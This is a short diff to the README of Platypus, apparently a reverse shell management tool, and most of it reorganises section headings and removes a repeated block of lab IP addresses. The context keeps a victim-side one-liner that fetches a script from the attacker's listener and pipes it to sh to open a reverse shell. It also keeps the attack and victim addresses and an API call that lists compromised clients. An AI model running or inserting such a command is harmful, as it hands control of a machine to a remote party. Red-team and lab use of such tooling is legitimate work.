@@ -23,13 +23,15 @@ go run platypus.go
 # ./Platypus_linux_amd64
 ```
 
-#### Reverse shell as a Service
+#### Use Case
 ```
 Attack IP: 192.168.1.2
     Reverse Shell Service: 0.0.0.0:8080
     RESTful Service: 127.0.0.1:9090
 Victim IP: 192.168.1.3
 ```
+
+#### Reverse shell as a Service
 ```bash
 // Platypus is able to multiplexing the reverse shell listening port
 // The port 8080 can receive reverse shell client connection
@@ -49,12 +51,6 @@ curl http://192.168.1.2:8080/192.168.1.2/8080|sh
 ```
 
 #### RESTful API
-```
-Attack IP: 192.168.1.2
-    Reverse Shell Service: 0.0.0.0:8080
-    RESTful Service: 127.0.0.1:9090
-Victim IP: 192.168.1.3
-```
 * `GET /client` List all online clients
 ```
 # curl 'http://127.0.0.1:9090/client'
